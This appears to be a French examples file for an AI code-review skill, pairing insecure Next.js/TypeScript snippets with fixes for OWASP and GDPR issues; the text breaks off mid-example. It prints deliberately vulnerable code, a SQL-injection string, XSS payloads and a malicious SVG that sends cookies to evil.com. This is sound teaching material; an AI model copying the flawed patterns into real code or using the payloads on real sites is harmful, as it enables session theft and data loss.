# EXAMPLES — Bugs types et corrections

Ce fichier contient des exemples concrets de bugs de sécurité/conformité rencontrés en pratique, et leur correction attendue. Le skill doit reconnaître ces patterns et appliquer la correction automatiquement.

## EXEMPLE 1 — Secret API en clair dans le code

### ❌ Bug détecté

```typescript
// lib/stripe.ts
const stripe = new Stripe('sk_live_51ABCdefGHIjklMNOpqrSTUvwxYZ');

export async function createPayment(amount: number) {
  return stripe.paymentIntents.create({ amount, currency: 'eur' });
}
```

### ✅ Correction automatique

```typescript
// lib/stripe.ts
import Stripe from 'stripe';

if (!process.env.STRIPE_SECRET_KEY) {
  throw new Error('STRIPE_SECRET_KEY manquant — vérifiez .env.local');
}

export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY, {
  apiVersion: '2024-06-20',
});

export async function createPayment(amount: number) {
  return stripe.paymentIntents.create({ amount, currency: 'eur' });
}
```

**Explication :** Le secret Stripe en clair est dans le code source → compromis si le repo est public ou si un collaborateur part. Correction : extraire vers `process.env.STRIPE_SECRET_KEY`, fail-fast si absent.

**Référence :** OWASP A02 — Cryptographic Failures

---

## EXEMPLE 2 — Injection SQL via template string

### ❌ Bug détecté

```typescript
// app/api/users/search/route.ts
export async function GET(request: Request) {
  const q = new URL(request.url).searchParams.get('q') ?? '';
  const users = await db.$queryRaw(
    `SELECT id, email, name FROM users WHERE name LIKE '%${q}%'`
  );
  return Response.json(users);
}
```

### ✅ Correction automatique

```typescript
// app/api/users/search/route.ts
import { z } from 'zod';

const SearchSchema = z.object({
  q: z.string().min(1).max(100),
});

export async function GET(request: Request) {
  const url = new URL(request.url);
  const parsed = SearchSchema.safeParse({ q: url.searchParams.get('q') });
  if (!parsed.success) {
    return Response.json({ error: 'Query invalide' }, { status: 400 });
  }

  // Prisma paramétré — pas d'injection possible
  const users = await db.user.findMany({
    where: { name: { contains: parsed.data.q, mode: 'insensitive' } },
    select: { id: true, name: true, email: true },
    take: 20,
  });

  return Response.json(users);
}
```

**Explication :** L'entrée `q` est interpolée directement dans la requête SQL → un attaquant peut injecter `'; DROP TABLE users; --`. Correction : utiliser Prisma (paramétré) et valider avec Zod.

**Référence :** OWASP A03 — Injection

---

## EXEMPLE 3 — XSS via `dangerouslySetInnerHTML`

### ❌ Bug détecté

```tsx
// components/user-bio.tsx
export function UserBio({ bio }: { bio: string }) {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}
```

### ✅ Correction automatique

```tsx
// components/user-bio.tsx
import DOMPurify from 'isomorphic-dompurify';

export function UserBio({ bio }: { bio: string }) {
  const sanitized = DOMPurify.sanitize(bio, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Explication :** Le contenu `bio` vient de l'utilisateur. S'il contient `<script>alert(document.cookie)</script>`, il s'exécute dans le navigateur de tout visiteur. Correction : sanitize avec DOMPurify (whitelist de tags/attributs).

**Référence :** OWASP A03 — XSS Stored

---

## EXEMPLE 4 — Cookie de session non sécurisé

### ❌ Bug détecté

```typescript
// app/api/auth/login/route.ts
export async function POST(request: Request) {
  const { email, password } = await request.json();
  const user = await verifyUser(email, password);
  if (!user) return Response.json({ error: 'Invalid' }, { status: 401 });

  const token = jwt.sign({ userId: user.id }, 'mysecret');
  const response = Response.json({ success: true });
  response.headers.set('Set-Cookie', `token=${token}; Path=/`);
  return response;
}
```

### ✅ Correction automatique

```typescript
// app/api/auth/login/route.ts
import { rateLimit } from '@/lib/rate-limit';
import { z } from 'zod';

const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});

export async function POST(request: Request) {
  // Rate limit
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ?? 'unknown';
  const { success } = await rateLimit(`login:${ip}`, 5, '1m');
  if (!success) {
    return Response.json({ error: 'Too many attempts' }, { status: 429, headers: { 'Retry-After': '60' } });
  }

  // Validation
  const body = await request.json();
  const parsed = LoginSchema.safeParse(body);
  if (!parsed.success) {
    return Response.json({ error: 'Invalid credentials' }, { status: 400 });
  }

  const user = await verifyUser(parsed.data.email, parsed.data.password);
  if (!user) {
    // Log sécurité
    await logger.security('login_failed', { email: maskEmail(parsed.data.email), ip });
    return Response.json({ error: 'Invalid credentials' }, { status: 401 });
  }

  const token = jwt.sign(
    { userId: user.id },
    process.env.JWT_SECRET!, // ≥ 32 chars
    { algorithm: 'HS256', expiresIn: '15m' }
  );

  const response = Response.json({ success: true });
  response.cookies.set('access_token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: 900,
  });
  return response;
}
```

**Explications :**
1. `'mysecret'` secret faible et en clair → variable d'env, ≥ 32 chars
2. Cookie sans `HttpOnly` → JS peut le lire (vol via XSS)
3. Cookie sans `Secure` → envoyé en HTTP (interceptable)
4. Cookie sans `SameSite` → vulnérable au CSRF
5. Pas de rate limit → brute force possible
6. Pas de validation → entrées potentiellement malicieuses

**Référence :** OWASP A07, A05, ePrivacy

---

## EXEMPLE 5 — IDOR (Insecure Direct Object Reference)

### ❌ Bug détecté

```typescript
// app/api/orders/[id]/route.ts
export async function GET(request: Request, { params }: { params: { id: string } }) {
  const order = await db.order.findUnique({ where: { id: params.id } });
  if (!order) return Response.json({ error: 'Not found' }, { status: 404 });
  return Response.json(order);
}
```

### ✅ Correction automatique

```typescript
// app/api/orders/[id]/route.ts
import { auth } from '@/lib/auth';

export async function GET(request: Request, { params }: { params: { id: string } }) {
  const session = await auth();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });

  const order = await db.order.findUnique({
    where: { id: params.id },
    select: { id: true, userId: true, total: true, items: true, createdAt: true },
  });

  if (!order) return Response.json({ error: 'Not found' }, { status: 404 });

  // Vérification d'appartenance
  if (order.userId !== session.userId && !session.roles.includes('admin')) {
    return Response.json({ error: 'Forbidden' }, { status: 403 });
  }

  // Ne pas exposer userId dans la réponse
  const { userId, ...safeOrder } = order;
  return Response.json(safeOrder);
}
```

**Explication :** N'importe quel utilisateur authentifié peut lire n'importe quelle commande en changeant l'ID dans l'URL. Correction : vérifier que la commande appartient à l'utilisateur (ou qu'il est admin).

**Référence :** OWASP A01 — Broken Access Control

---

## EXEMPLE 6 — Route API appelée côté client inexistante

### ❌ Bug détecté

```tsx
// components/user-profile.tsx
'use client';
import { useEffect, useState } from 'react';

export function UserProfile({ userId }: { userId: string }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    fetch(`/api/user/${userId}`) // ❌ route inexistante (singulier)
      .then(r => r.json())
      .then(setUser);
  }, [userId]);

  return <div>{user?.name}</div>;
}
```

Le serveur définit `app/api/users/[id]/route.ts` (pluriel) mais le client appelle `/api/user/` (singulier).

### ✅ Correction automatique

```tsx
// components/user-profile.tsx
'use client';
import { useEffect, useState } from 'react';
import { apiFetch } from '@/lib/api';

export function UserProfile({ userId }: { userId: string }) {
  const [user, setUser] = useState(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    apiFetch('GET /api/users/:id', { params: { id: userId } })
      .then(setUser)
      .catch((err) => setError(err.message));
  }, [userId]);

  if (error) return <div role="alert">Erreur: {error}</div>;
  if (!user) return <div>Chargement...</div>;
  return <div>{user.name}</div>;
}
```

**Explication :** L'URL `/api/user/${userId}` (singulier) ne correspond à aucune route serveur (qui est au pluriel `/api/users/[id]`). Correction : utiliser `apiFetch` qui valide l'existence de la route à la compilation.

**Référence :** `backend.md` §3 — Cohérence des routes

---

## EXEMPLE 7 — Tracker chargé sans consentement

### ❌ Bug détecté

```tsx
// app/layout.tsx
import Script from 'next/script';

export default function RootLayout({ children }) {
  return (
    <html>
      <head>
        <Script
          src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXX"
          strategy="afterInteractive"
        />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

### ✅ Correction automatique

```tsx
// app/layout.tsx
import { ConsentGate } from '@/components/consent-gate';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        {children}
        <ConsentGate category="analytics">
          <AnalyticsScripts />
        </ConsentGate>
        <CookieBanner />
      </body>
    </html>
  );
}

// components/analytics-scripts.tsx
'use client';
import Script from 'next/script';

export function AnalyticsScripts() {
  return (
    <>
      <Script
        src={`https://www.googletagmanager.com/gtag/js?id=${process.env.NEXT_PUBLIC_GA_ID}`}
        strategy="afterInteractive"
      />
      <Script id="ga-init" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', '${process.env.NEXT_PUBLIC_GA_ID}', { anonymize_ip: true });
        `}
      </Script>
    </>
  );
}

// components/consent-gate.tsx
'use client';
import { useState, useEffect } from 'react';
import { getConsent } from '@/lib/consent';

export function ConsentGate({ category, children }: {
  category: 'analytics' | 'marketing' | 'functional';
  children: React.ReactNode;
}) {
  const [show, setShow] = useState(false);

  useEffect(() => {
    const consent = getConsent();
    if (consent?.[category]) setShow(true);

    const handler = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (detail?.[category]) setShow(true);
    };
    window.addEventListener('consent-change', handler);
    return () => window.removeEventListener('consent-change', handler);
  }, [category]);

  if (!show) return null;
  return <>{children}</>;
}
```

**Explication :** Charger Google Analytics sans consentement préalable viole ePrivacy + RGPD (sanctions CNIL jusqu'à 4% du CA). Correction : conditionner le chargement à un consentement explicite.

**Référence :** `gdpr.md` §5 — Cookies

---

## EXEMPLE 8 — Endpoint admin exposé sans auth

### ❌ Bug détecté

```typescript
// app/api/admin/users/route.ts
export async function GET() {
  const users = await db.user.findMany();
  return Response.json(users);
}
```

### ✅ Correction automatique

```typescript
// app/api/admin/users/route.ts
import { auth } from '@/lib/auth';
import { requireRole } from '@/lib/rbac';

export async function GET() {
  const session = await auth();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });
  
  try {
    requireRole(session, ['admin']);
  } catch {
    return Response.json({ error: 'Forbidden' }, { status: 403 });
  }

  const users = await db.user.findMany({
    select: { id: true, email: true, name: true, role: true, createdAt: true, lastLoginAt: true },
  });
  return Response.json(users);
}
```

**Explication :** La route `/api/admin/users` retourne tous les utilisateurs sans authentification. N'importe qui peut récupérer la base utilisateurs. Correction : exiger authentification + rôle admin, et ne pas exposer les champs sensibles (passwordHash).

**Référence :** OWASP A01 — Broken Access Control

---

## EXEMPLE 9 — Webhook Stripe sans vérification de signature

### ❌ Bug détecté

```typescript
// app/api/webhooks/stripe/route.ts
import { stripe } from '@/lib/stripe';

export async function POST(request: Request) {
  const event = await request.json();
  
  if (event.type === 'payment_intent.succeeded') {
    await fulfillOrder(event.data.object);
  }
  
  return Response.json({ received: true });
}
```

### ✅ Correction automatique

```typescript
// app/api/webhooks/stripe/route.ts
import { stripe } from '@/lib/stripe';
import { logger } from '@/lib/logger';

export async function POST(request: Request) {
  const body = await request.text(); // IMPORTANT: text() pas json()
  const signature = request.headers.get('stripe-signature');

  if (!signature) {
    return Response.json({ error: 'Missing signature' }, { status: 400 });
  }

  let event;
  try {
    event = stripe.webhooks.constructEvent(
      body,
      signature,
      process.env.STRIPE_WEBHOOK_SECRET!
    );
  } catch (err) {
    await logger.security('webhook_signature_failed', {
      service: 'stripe',
      error: err.message,
    });
    return Response.json({ error: 'Invalid signature' }, { status: 400 });
  }

  // Idempotence — vérifier qu'on n'a pas déjà traité cet event
  const existing = await db.webhookEvent.findUnique({ where: { id: event.id } });
  if (existing) {
    return Response.json({ received: true, duplicate: true });
  }

  try {
    if (event.type === 'payment_intent.succeeded') {
      await fulfillOrder(event.data.object);
    }
    await db.webhookEvent.create({
      data: { id: event.id, type: event.type, processedAt: new Date() },
    });
  } catch (err) {
    logger.error('webhook_processing_failed', { eventId: event.id, error: err.message });
    return Response.json({ error: 'Processing failed' }, { status: 500 });
  }

  return Response.json({ received: true });
}
```

**Explication :** Sans vérification de signature, un attaquant peut envoyer un faux webhook `payment_intent.succeeded` pour valider des commandes non payées. Correction : utiliser `constructEvent` avec le secret webhook, et assurer l'idempotence.

**Référence :** OWASP A08 — Software & Data Integrity Failures

---

## EXEMPLE 10 — Formulaire sans validation serveur

### ❌ Bug détecté

```tsx
// app/contact/page.tsx
'use client';
import { useState } from 'react';

export default function ContactPage() {
  const [email, setEmail] = useState('');
  const [message, setMessage] = useState('');

  const submit = async () => {
    await fetch('/api/contact', {
      method: 'POST',
      body: JSON.stringify({ email, message }),
    });
  };

  return (
    <form onSubmit={(e) => { e.preventDefault(); submit(); }}>
      <input value={email} onChange={(e) => setEmail(e.target.value)} />
      <textarea value={message} onChange={(e) => setMessage(e.target.value)} />
      <button>Envoyer</button>
    </form>
  );
}
```

```typescript
// app/api/contact/route.ts
export async function POST(request: Request) {
  const { email, message } = await request.json();
  await sendEmail('contact@site.com', email, message);
  return Response.json({ success: true });
}
```

### ✅ Correction automatique

```tsx
// app/contact/page.tsx
'use client';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { ContactSchema } from '@/schemas/contact';
import { apiFetch } from '@/lib/api';

export default function ContactPage() {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm({
    resolver: zodResolver(ContactSchema),
  });

  const onSubmit = async (data) => {
    try {
      await apiFetch('POST /api/contact', { body: data, csrf: true });
    } catch (err) {
      // gestion
    }
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} noValidate>
      <label htmlFor="email">Email</label>
      <input id="email" type="email" autoComplete="email" {...register('email')} />
      {errors.email && <p role="alert">{errors.email.message}</p>}

      <label htmlFor="message">Message</label>
      <textarea id="message" minLength={10} maxLength={2000} {...register('message')} />
      {errors.message && <p role="alert">{errors.message.message}</p>}

      <button disabled={isSubmitting}>Envoyer</button>
    </form>
  );
}
```

```typescript
// app/api/contact/route.ts
import { z } from 'zod';
import { rateLimit } from '@/lib/rate-limit';

const ContactSchema = z.object({
  email: z.string().email().max(254),
  message: z.string().min(10).max(2000),
  name: z.string().min(1).max(100).optional(),
  // Honeypot anti-spam
  website: z.string().max(0).optional(),
});

export async function POST(request: Request) {
  // Rate limit
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ?? 'unknown';
  const { success } = await rateLimit(`contact:${ip}`, 3, '1h');
  if (!success) return Response.json({ error: 'Too many requests' }, { status: 429 });

  // Validation
  const body = await request.json();
  const parsed = ContactSchema.safeParse(body);
  if (!parsed.success) {
    return Response.json({ error: 'Invalid', issues: parsed.error.flatten() }, { status: 400 });
  }

  // Honeypot — si rempli, c'est un bot
  if (parsed.data.website) {
    return Response.json({ success: true }); // faire semblant d'accepter
  }

  await sendEmail('contact@site.com', parsed.data.email, parsed.data.message);
  return Response.json({ success: true });
}
```

**Explication :** Le formulaire original n'a aucune validation serveur — un attaquant peut envoyer n'importe quoi (email invalide, message vide de 100000 caractères, etc.) et spammer l'endpoint. Correction : validation Zod partagée client/serveur, rate limiting, honeypot anti-bot.

**Référence :** OWASP A04 — Insecure Design

---

## EXEMPLE 11 — Open Redirect

### ❌ Bug détecté

```typescript
// app/api/auth/login/route.ts
const from = new URL(request.url).searchParams.get('from') ?? '/';
return Response.redirect(from);
```

### ✅ Correction automatique

```typescript
// app/api/auth/login/route.ts
function safeRedirect(from: string | null): string {
  if (!from) return '/';
  // Autoriser uniquement les URLs relatives
  if (!from.startsWith('/') || from.startsWith('//')) return '/';
  // Pas de backtracking
  if (from.includes('\0') || from.includes('\r') || from.includes('\n')) return '/';
  return from;
}

const from = safeRedirect(new URL(request.url).searchParams.get('from'));
return Response.redirect(new URL(from, request.url));
```

**Explication :** `from=https://evil.com` permettrait de rediriger l'utilisateur vers un site de phishing après login. Correction : n'accepter que les URLs relatives (commençant par `/` mais pas `//`).

**Référence :** OWASP A01 — Broken Access Control

---

## EXEMPLE 12 — Pas de page /privacy

### ❌ Bug détecté

L'application a un formulaire d'inscription qui collecte email + nom, mais aucune page `/privacy` ni `/legal`.

### ✅ Correction automatique

Créer les pages manquantes :

```tsx
// app/privacy/page.tsx
export const metadata = { title: 'Politique de confidentialité' };

export default function PrivacyPage() {
  return (
    <main className="prose">
      <h1>Politique de confidentialité</h1>
      <p>Dernière mise à jour : {new Date().toLocaleDateString('fr-FR')}</p>

      <h2>Responsable du traitement</h2>
      <p>[Nom de l'entreprise], SIRET [numéro], [adresse]</p>
      <p>Contact DPO : <a href="mailto:dpo@example.com">dpo@example.com</a></p>

      <h2>Données collectées</h2>
      <ul>
        <li>Email — pour l'authentification et la communication</li>
        <li>Nom — pour personnaliser l'interface</li>
        <li>Adresse IP — pour la sécurité (logs, 13 mois)</li>
      </ul>

      <h2>Finalités et base légale</h2>
      <ul>
        <li>Création de compte — base contractuelle (art. 6.1.b RGPD)</li>
        <li>Newsletter — consentement (art. 6.1.a RGPD)</li>
        <li>Sécurité du service — intérêt légitime (art. 6.1.f RGPD)</li>
      </ul>

      <h2>Durée de conservation</h2>
      <ul>
        <li>Compte actif : durée de vie du compte</li>
        <li>Compte supprimé : anonymisation immédiate</li>
        <li>Logs de sécurité : 13 mois</li>
      </ul>

      <h2>Vos droits</h2>
      <p>Vous pouvez exercer vos droits (accès, rectification, effacement, portabilité, opposition) en écrivant à <a href="mailto:dpo@example.com">dpo@example.com</a>.</p>
      <p>Vous pouvez déposer une réclamation auprès de la CNIL : <a href="https://www.cnil.fr/fr/plaintes">https://www.cnil.fr/fr/plaintes</a>.</p>

      <h2>Cookies</h2>
      <p>Voir notre <a href="/cookies">politique cookies</a>.</p>
    </main>
  );
}
```

```tsx
// app/legal/page.tsx
export const metadata = { title: 'Mentions légales' };

export default function LegalPage() {
  return (
    <main className="prose">
      <h1>Mentions légales</h1>
      <h2>Éditeur</h2>
      <p>[Nom entreprise] — [Statut juridique] — Capital : [X €]</p>
      <p>SIRET : [numéro] — RCS [ville] B [numéro]</p>
      <p>Siège : [adresse complète]</p>
      <p>TVA intracom : [numéro]</p>

      <h2>Directeur de publication</h2>
      <p>[Nom du directeur]</p>

      <h2>Hébergeur</h2>
      <p>[Nom hébergeur] — [adresse] — [téléphone]</p>

      <h2>Contact</h2>
      <p>Email : <a href="mailto:contact@example.com">contact@example.com</a></p>
    </main>
  );
}
```

**Explication :** La collecte d'email sans page de politique de confidentialité est une violation du RGPD (art. 13, 14). Correction : créer les pages obligatoires.

**Référence :** RGPD art. 13, 14 ; Loi pour une République Numérique

---

## EXEMPLE 13 — Headers HTTP de sécurité manquants

### ❌ Bug détecté

```js
// next.config.js
module.exports = {
  reactStrictMode: true,
};
```

### ✅ Correction automatique

```js
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self'",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "upgrade-insecure-requests",
    ].join('; '),
  },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
];

module.exports = {
  reactStrictMode: true,
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }];
  },
};
```

**Explication :** Sans ces headers, le site est vulnérable au clickjacking (X-Frame-Options), au MIME sniffing (X-Content-Type-Options), au downgrade HTTP (HSTS), et aux injections de script (CSP).

**Référence :** OWASP A05 — Security Misconfiguration

---

## EXEMPLE 14 — JWT secret faible

### ❌ Bug détecté

```typescript
const token = jwt.sign({ userId }, 'secret', { expiresIn: '1d' });
const verified = jwt.verify(token, 'secret') as { userId: string };
```

### ✅ Correction automatique

```typescript
// lib/env.ts — validation au démarrage
import { z } from 'zod';

const EnvSchema = z.object({
  JWT_SECRET: z.string().min(32, 'JWT_SECRET doit faire au moins 32 caractères'),
  JWT_REFRESH_SECRET: z.string().min(32),
});

export const env = EnvSchema.parse(process.env);

// lib/jwt.ts
import jwt from 'jsonwebtoken';
import { env } from './env';

export function signAccessToken(userId: string): string {
  return jwt.sign({ userId }, env.JWT_SECRET, {
    algorithm: 'HS256',
    expiresIn: '15m',
  });
}

export function verifyAccessToken(token: string): { userId: string } {
  return jwt.verify(token, env.JWT_SECRET, { algorithms: ['HS256'] }) as { userId: string };
}
```

**Explication :** `'secret'` est trivial à deviner/brute-forcer. N'importe qui peut forger des JWT valides. Correction : générer avec `openssl rand -hex 32`, stocker en variable d'env, valider au démarrage.

**Référence :** OWASP A02 — Cryptographic Failures

---

## EXEMPLE 15 — Modification de password sans re-auth

### ❌ Bug détecté

```typescript
// app/api/account/password/route.ts
export async function PATCH(request: Request) {
  const session = await auth();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });

  const { newPassword } = await request.json();
  const hash = await bcrypt.hash(newPassword, 12);
  await db.user.update({ where: { id: session.userId }, data: { passwordHash: hash } });
  return Response.json({ success: true });
}
```

### ✅ Correction automatique

```typescript
// app/api/account/password/route.ts
import { z } from 'zod';

const ChangePasswordSchema = z.object({
  currentPassword: z.string().min(1),
  newPassword: z.string()
    .min(12)
    .regex(/[A-Z]/).regex(/[a-z]/).regex(/[0-9]/).regex(/[^A-Za-z0-9]/),
}).refine(d => d.currentPassword !== d.newPassword, {
  message: 'Le nouveau mot de passe doit être différent',
  path: ['newPassword'],
});

export async function PATCH(request: Request) {
  const session = await auth();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });

  const parsed = ChangePasswordSchema.safeParse(await request.json());
  if (!parsed.success) {
    return Response.json({ error: 'Invalid', issues: parsed.error.flatten() }, { status: 400 });
  }

  // Re-authentification obligatoire
  const user = await db.user.findUnique({ where: { id: session.userId } });
  const valid = await bcrypt.compare(parsed.data.currentPassword, user.passwordHash);
  if (!valid) {
    return Response.json({ error: 'Current password invalid' }, { status: 401 });
  }

  // Mise à jour
  const hash = await bcrypt.hash(parsed.data.newPassword, 12);
  await db.user.update({ where: { id: session.userId }, data: { passwordHash: hash } });

  // Invalidation des autres sessions
  await db.session.deleteMany({
    where: { userId: session.userId, id: { not: session.sessionId } },
  });

  // Audit log
  await logger.audit('password_changed', { userId: session.userId });

  return Response.json({ success: true });
}
```

**Explication :** Si l'attaquant a volé la session (XSS, cookie volé), il peut changer le password sans connaître l'ancien → prise de contrôle définitive. Correction : exiger le mot de passe actuel, invalider les autres sessions.

**Référence :** OWASP A07 — Authentication Failures

---

## EXEMPLE 16 — Sitemap et footer désynchronisés des pages légales

### ❌ Bug détecté

Le footer contient des liens en ancres vers une section d'une vieille page :

```tsx
// components/footer.tsx
<footer>
  <a href="/#mentions-legales">Mentions légales</a>
  <a href="/#confidentialite">Confidentialité</a>
</footer>
```

La route `app/sitemap.ts` n'existe pas (pas de sitemap généré). Un `sitemap.xml` statique legacy mentionne uniquement `/`, `/contact`, `/guestbook` — les pages légales récemment créées (`/privacy`, `/legal`, `/cookies`) en sont absentes.

### ✅ Correction automatique

**1. Créer / mettre à jour le sitemap**

```typescript
// app/sitemap.ts
import { MetadataRoute } from 'next';

export default function sitemap(): MetadataRoute.Sitemap {
  const baseUrl = process.env.NEXT_PUBLIC_SITE_URL!;
  const lastModified = new Date();

  return [
    { url: `${baseUrl}/`, lastModified, changeFrequency: 'weekly', priority: 1 },
    { url: `${baseUrl}/contact`, lastModified, changeFrequency: 'monthly', priority: 0.7 },
    { url: `${baseUrl}/guestbook`, lastModified, changeFrequency: 'monthly', priority: 0.7 },
    { url: `${baseUrl}/legal`, lastModified, changeFrequency: 'yearly', priority: 0.3 },
    { url: `${baseUrl}/privacy`, lastModified, changeFrequency: 'yearly', priority: 0.3 },
    { url: `${baseUrl}/cookies`, lastModified, changeFrequency: 'yearly', priority: 0.3 },
  ];
}
```

**2. Mettre à jour le footer avec URLs cohérentes**

```tsx
// components/footer.tsx
const LEGAL_LINKS = [
  { href: '/legal', label: 'Mentions légales' },
  { href: '/privacy', label: 'Politique de confidentialité' },
  { href: '/cookies', label: 'Gestion des cookies' },
] as const;

export function Footer() {
  return (
    <footer>
      <nav aria-label="Liens légaux">
        <ul>
          {LEGAL_LINKS.map(link => (
            <li key={link.href}>
              <a href={link.href}>{link.label}</a>
            </li>
          ))}
        </ul>
      </nav>
    </footer>
  );
}
```

**3. Ajouter la canonical sur chaque page légale**

```tsx
// app/privacy/page.tsx
export const metadata = {
  title: 'Politique de confidentialité',
  alternates: { canonical: '/privacy' },
  robots: { index: true, follow: true },
};
```

**4. Vérifier `robots.txt` n'exclut pas les pages légales**

```typescript
// app/robots.ts
import { MetadataRoute } from 'next';

export default function robots(): MetadataRoute.Robots {
  return {
    rules: { userAgent: '*', allow: '/' },
    sitemap: `${process.env.NEXT_PUBLIC_SITE_URL}/sitemap.xml`,
  };
}
```

**Explication :** Le footer en `/#mentions-legales` est un anti-pattern : pas de page dédiée, contenu non deep-linkable, non indexable par les moteurs. L'absence des pages légales du sitemap les rend invisibles pour Google. La divergence footer (`/mentions-legales`) vs sitemap (`/legal`) crée du duplicate content. Correction : triplet cohérent (page physique + footer + sitemap) avec URLs identiques et canonical stable.

**Référence :** `gdpr.md` §9 — Navigation légale cohérente ; Loi pour une République Numérique

---

## EXEMPLE 17 — Upload de SVG avec XSS

### ❌ Bug détecté

```typescript
// app/api/upload/route.ts
export async function POST(request: Request) {
  const formData = await request.formData();
  const file = formData.get('file') as File;
  
  // Validation basique sur Content-Type (contournable)
  if (!file.type.startsWith('image/')) {
    return Response.json({ error: 'Type invalide' }, { status: 400 });
  }
  
  const filename = file.name; // ⚠️ path traversal possible
  const buffer = Buffer.from(await file.arrayBuffer());
  await fs.writeFile(`./public/uploads/${filename}`, buffer);
  
  return Response.json({ url: `/uploads/${filename}` });
}
```

Un attaquant upload `evil.svg` :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com/?c='+document.cookie)">
  <script>alert(document.cookie)</script>
</svg>
```

Quand un admin ouvre l'URL `/uploads/evil.svg`, le script s'exécute dans son navigateur → vol du cookie admin (même `HttpOnly` ne protège pas, le script peut faire d'autres actions).

### ✅ Correction automatique

```typescript
// app/api/upload/route.ts
import sharp from 'sharp';
import { randomUUID } from 'crypto';
import path from 'path';
import { detectRealMimeType } from '@/lib/file-validation';
import { s3 } from '@/lib/s3';
import { PutObjectCommand } from '@aws-sdk/client-s3';

const ALLOWED_MIME = ['image/jpeg', 'image/png', 'image/webp'];
const MAX_SIZE = 5 * 1024 * 1024;
const ALLOWED_EXT = ['.jpg', '.jpeg', '.png', '.webp'];

export async function POST(request: Request) {
  const formData = await request.formData();
  const file = formData.get('file') as File;
  
  if (!file) return Response.json({ error: 'Fichier manquant' }, { status: 400 });
  if (file.size > MAX_SIZE) {
    return Response.json({ error: 'Trop volumineux (max 5 Mo)' }, { status: 413 });
  }
  
  // Vérifier extension
  const ext = path.extname(file.name).toLowerCase();
  if (!ALLOWED_EXT.includes(ext)) {
    return Response.json({ error: 'Extension non autorisée' }, { status: 400 });
  }
  
  // 1. Magic bytes — pas confiance au Content-Type
  const buffer = Buffer.from(await file.arrayBuffer());
  const realMime = detectRealMimeType(buffer);
  if (!realMime || !ALLOWED_MIME.includes(realMime)) {
    return Response.json({ error: 'Format non supporté' }, { status: 400 });
  }
  
  // 2. Rejeter SVG explicitement (même si renommé en .jpg)
  if (buffer.slice(0, 4).toString('utf-8') === '<svg' || 
      buffer.slice(0, 5).toString('utf-8') === '<?xml') {
    return Response.json({ error: 'SVG interdit' }, { status: 400 });
  }
  
  // 3. Re-encoder avec sharp — strip EXIF + redimensionner
  const processed = await sharp(buffer)
    .resize(1920, 1920, { fit: 'inside', withoutEnlargement: true })
    .jpeg({ quality: 85 })
    .toBuffer();
  
  // 4. Nom UUID — pas confiance au filename utilisateur
  const filename = `${randomUUID()}.jpg`;
  
  // 5. Stockage bucket PRIVÉ (pas public/)
  await s3.send(new PutObjectCommand({
    Bucket: process.env.S3_BUCKET!,
    Key: `uploads/${filename}`,
    Body: processed,
    ContentType: 'image/jpeg',
    ServerSideEncryption: 'AES256',
  }));
  
  // 6. URL via route API qui vérifie l'auth
  return Response.json({ 
    url: `/api/files/${filename}`,
    filename,
  });
}
```

**Explications :**
1. `file.type` est envoyé par le client, contournable → magic bytes
2. `file.name` pouvait contenir `../../etc/passwd` → UUID + extension whitelistée
3. SVG interdit (XSS possible via `<script>` ou `onload`)
4. `sharp` re-encode l'image → EXIF GPS supprimé
5. Bucket S3 privé + route API pour servir avec auth, pas `public/`

**Référence :** `advanced.md` §1 — File upload security

---

## EXEMPLE 18 — Énumération d'utilisateurs via inscription

### ❌ Bug détecté

```typescript
// app/api/auth/register/route.ts
export async function POST(request: Request) {
  const { email } = await request.json();
  
  const existing = await db.user.findUnique({ where: { email } });
  if (existing) {
    // ⚠️ Révèle que l'email existe
    return Response.json({ error: 'Cet email est déjà inscrit' }, { status: 409 });
  }
  
  await createUser(email);
  return Response.json({ success: true });
}
```

Un attaquant peut tester 10000 emails et obtenir la liste de tous les inscrits (attaque d'énumération, préparation à du phishing ciblé).

### ✅ Correction automatique

```typescript
// app/api/auth/register/route.ts
export async function POST(request: Request) {
  const { email } = RegisterSchema.parse(await request.json());
  
  const existing = await db.user.findUnique({ where: { email } });
  
  if (existing) {
    // Email de "déjà inscrit" — pas d'info sur l'existence
    await sendEmail(email, 'register-attempt', { 
